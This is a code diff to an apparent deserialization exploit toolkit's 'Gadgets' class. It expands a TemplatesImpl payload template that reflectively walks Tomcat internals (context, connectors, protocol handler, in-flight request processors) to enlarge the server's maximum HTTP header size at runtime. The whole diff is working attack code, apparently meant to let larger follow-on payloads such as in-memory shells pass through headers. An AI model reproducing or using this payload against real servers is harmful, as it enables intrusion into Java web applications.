@@ -90,22 +90,43 @@ public class Gadgets {
         String template = "try {\n" +
             "            java.lang.reflect.Field contextField = org.apache.catalina.core.StandardContext.class.getDeclaredField(\"context\");\n" +
             "            java.lang.reflect.Field serviceField = org.apache.catalina.core.ApplicationContext.class.getDeclaredField(\"service\");\n" +
+            "            java.lang.reflect.Field requestField = org.apache.coyote.RequestInfo.class.getDeclaredField(\"req\");\n" +
+            "            java.lang.reflect.Field headerSizeField = org.apache.coyote.http11.Http11InputBuffer.class.getDeclaredField(\"headerBufferSize\");\n" +
+            "            java.lang.reflect.Method getHandlerMethod = org.apache.coyote.AbstractProtocol.class.getDeclaredMethod(\"getHandler\",null);\n" +
             "            contextField.setAccessible(true);\n" +
+            "            headerSizeField.setAccessible(true);\n" +
             "            serviceField.setAccessible(true);\n" +
+            "            requestField.setAccessible(true);\n" +
+            "            getHandlerMethod.setAccessible(true);\n" +
             "            org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =\n" +
             "                    (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();\n" +
             "            org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(webappClassLoaderBase.getResources().getContext());\n" +
             "            org.apache.catalina.core.StandardService standardService = (org.apache.catalina.core.StandardService) serviceField.get(applicationContext);\n" +
             "            org.apache.catalina.connector.Connector[] connectors = standardService.findConnectors();\n" +
-            "            for (int i=0;i<connectors.length;i++) {\n" +
-            "                if (4==connectors[i].getScheme().length()) {\n" +
+            "            for (int i = 0; i < connectors.length; i++) {\n" +
+            "                if (4 == connectors[i].getScheme().length()) {\n" +
             "                    org.apache.coyote.ProtocolHandler protocolHandler = connectors[i].getProtocolHandler();\n" +
-            "                   if (protocolHandler instanceof org.apache.coyote.http11.AbstractHttp11Protocol) {\n"+
-            "                    ((org.apache.coyote.http11.AbstractHttp11Protocol)protocolHandler).setMaxHttpHeaderSize("+command+");\n" +
-            "                   }\n"+
+            "                    if (protocolHandler instanceof org.apache.coyote.http11.AbstractHttp11Protocol) {\n" +
+            "                        Class[] classes = org.apache.coyote.AbstractProtocol.class.getDeclaredClasses();\n" +
+            "                        for (int j = 0; j < classes.length; j++) {\n" +
+            "                            if (52 == (classes[j].getName().length()) || 60 == (classes[j].getName().length())) {\n" +
+            "                                java.lang.reflect.Field globalField = classes[j].getDeclaredField(\"global\");\n" +
+            "                                java.lang.reflect.Field processorsField = org.apache.coyote.RequestGroupInfo.class.getDeclaredField(\"processors\");\n" +
+            "                                globalField.setAccessible(true);\n" +
+            "                                processorsField.setAccessible(true);\n" +
+            "                                org.apache.coyote.RequestGroupInfo requestGroupInfo = (org.apache.coyote.RequestGroupInfo) globalField.get(getHandlerMethod.invoke(protocolHandler, null));\n" +
+            "                                java.util.List list = (java.util.List) processorsField.get(requestGroupInfo);\n" +
+            "                                for (int k = 0; k < list.size(); k++) {\n" +
+            "                                    org.apache.coyote.Request tempRequest = (org.apache.coyote.Request) requestField.get(list.get(k));\n" +
+            "                                    headerSizeField.set(tempRequest.getInputBuffer()," + command +");\n" +
+            "                                }\n" +
+            "                            }\n" +
+            "                        }\n" +
+            "                        ((org.apache.coyote.http11.AbstractHttp11Protocol) protocolHandler).setMaxHttpHeaderSize(" + command +");\n" +
+            "                    }\n" +
             "                }\n" +
             "            }\n" +
-            "        }catch (Exception e){\n" +
+            "        } catch (Exception e) {\n" +
             "        }";
         return createTemplatesImpl(command, template);
     }
